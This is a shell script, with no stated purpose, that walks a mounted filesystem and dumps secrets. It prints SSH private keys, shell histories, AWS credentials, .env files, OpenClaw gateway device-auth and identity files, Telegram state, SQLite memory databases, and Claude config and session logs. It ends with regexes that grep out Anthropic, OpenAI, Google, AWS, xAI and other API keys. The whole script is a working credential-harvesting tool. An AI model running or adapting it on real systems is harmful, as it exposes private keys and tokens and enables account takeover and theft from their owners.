#!/bin/sh
sec(){ echo "---$1---"; }
sec ROOT_TREE; ls -laR /ctx/root 2>&1 | head -70
sec ROOT_ALLFILES; find /ctx/root -type f 2>/dev/null | head -60
sec ROOT_HIST; head -c 3000 /ctx/root/.bash_history 2>&1; echo
sec ROOT_CFG_FILES; find /ctx/root/.config /ctx/root/.local /ctx/root/.openclaw /ctx/root/.aws 2>/dev/null | head -60
sec QT_TOKENS; for f in $(find /ctx/root -name 'tokens.json' -o -name 'credentials' -o -name 'config' -path '*aws*' 2>/dev/null | head -10); do echo "## $f"; head -c 2000 "$f" 2>&1; echo; done
sec ROOT_SSH; ls -la /ctx/root/.ssh 2>&1; for f in /ctx/root/.ssh/*; do echo "## $f"; head -c 2500 "$f" 2>&1; echo; done
sec HOME_TREE; ls -la /ctx/home 2>&1; for d in /ctx/home/*; do echo "## $d"; ls -la "$d" 2>&1 | head -30; done
sec HOME_SSH; for f in /ctx/home/*/.ssh/*; do echo "## $f"; head -c 2500 "$f" 2>&1; echo; done
sec HOME_HIST; head -c 2500 /ctx/home/ubuntu/.bash_history 2>&1; echo
sec RUNNER_ENV; cat /ctx/home/ubuntu/actions-runner/.env 2>&1 | head -c 1500
sec HOME_FILES; find /ctx/home -maxdepth 3 -type f 2>/dev/null | head -60
sec HERMESDATA; ls -la /ctx/openclaw/hermes-data 2>&1; cat /ctx/openclaw/hermes-data/.env 2>&1 | head -c 2000
sec ENVS; for f in /ctx/openclaw/.env /ctx/openclaw/gateway.env /ctx/openclaw/hermes.env /ctx/openclaw/hermes-data/.env /ctx/etc/environment; do echo "## $f"; cat "$f" 2>&1; done
sec GW_JSON; for f in /ctx/openclaw/gateway-state/openclaw.json /ctx/openclaw/gateway-state/openclaw.json.last-good /ctx/openclaw/gateway-state/openclaw.json.bak; do echo "## $f"; head -c 5000 "$f" 2>&1; echo; done
sec GW_SMALL; for f in /ctx/openclaw/gateway-state/identity/device-auth.json /ctx/openclaw/gateway-state/identity/device.json /ctx/openclaw/gateway-state/devices/paired.json /ctx/openclaw/gateway-state/update-check.json /ctx/openclaw/gateway-state/logs/config-audit.jsonl; do echo "## $f"; head -c 2000 "$f" 2>&1; echo; done
sec GW_TG; for f in /ctx/openclaw/gateway-state/telegram/*; do echo "## $f"; head -c 500 "$f" 2>&1; echo; done
sec GW_DBS; for f in /ctx/openclaw/gateway-state/tasks/runs.sqlite /ctx/openclaw/gateway-state/memory/main.sqlite; do echo "## $f"; head -c 6000 "$f" 2>&1 | tr -c '[:print:]\n' ' ' | head -60; echo; done
sec CLAUDE_FILES; find /ctx/openclaw/claude-home -type f 2>/dev/null | head -80
sec CLAUDE_CFG; head -c 5000 /ctx/openclaw/claude-home/.claude.json 2>&1; echo
sec CLAUDE_BAK; head -c 4000 /ctx/openclaw/claude-home/backups/.claude.json.backup.1776526310494 2>&1; echo
sec CLAUDE_SESS; for f in $(find /ctx/openclaw/claude-home -name '*.jsonl' 2>/dev/null | head -10); do echo "## $f $(wc -c <"$f" 2>/dev/null)"; head -c 1500 "$f" 2>&1; echo; done
sec CLAUDE_SESSCFG; for f in $(find /ctx/openclaw/claude-home/projects -name '*.json' 2>/dev/null | head -10); do echo "## $f"; head -c 1000 "$f" 2>&1; echo; done
sec OCDATA; for f in /ctx/openclaw/data/*; do echo "## $f"; head -c 1200 "$f" 2>&1; echo; done
sec OCWS; find /ctx/openclaw/workspace /ctx/openclaw/seeds /ctx/openclaw/scripts -maxdepth 3 2>/dev/null | head -60
sec SYSTEMD; grep -rha "Environment" /ctx/etc/systemd 2>/dev/null | head -20
sec WWW; find /ctx/varwww -type f 2>/dev/null | head -30
sec GREP_PREFIX; grep -rhoE 'sk-ant-[A-Za-z0-9_-]{20,}|sk-or-v1-[a-f0-9]{64}|sk-proj-[A-Za-z0-9_-]{20,}|sk-svcacct-[A-Za-z0-9_-]{20,}|AIza[0-9A-Za-z_-]{35}|AQ\.Ab8RN6[A-Za-z0-9_-]{20,}|AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|xai-[A-Za-z0-9]{20,}' /ctx 2>/dev/null | sort -u | head -50
sec GREP_KEYNAMES; grep -rhaoE '(ANTHROPIC|OPENAI|GEMINI|GOOGLE|DEEPSEEK|NVIDIA|OPENROUTER|OPENCLAW|POOL_AI|XAI|GROQ|MISTRAL|TOGETHER|GITHUB|GH)_?[A-Z]*(KEY|TOKEN)[=: "]{1,4}[A-Za-z0-9_./:+-]{12,}' /ctx 2>/dev/null | sort -u | head -60
sec GREP_BASEURL; grep -rhoE 'https?://(api\.anthropic\.com|api\.openai\.com|generativelanguage\.googleapis\.com|openrouter\.ai|api\.deepseek\.com|integrate\.api\.nvidia\.com|localhost:[0-9]+|127\.0\.0\.1:[0-9]+)' /ctx 2>/dev/null | sort -u | head -20
echo "=====E1END====="
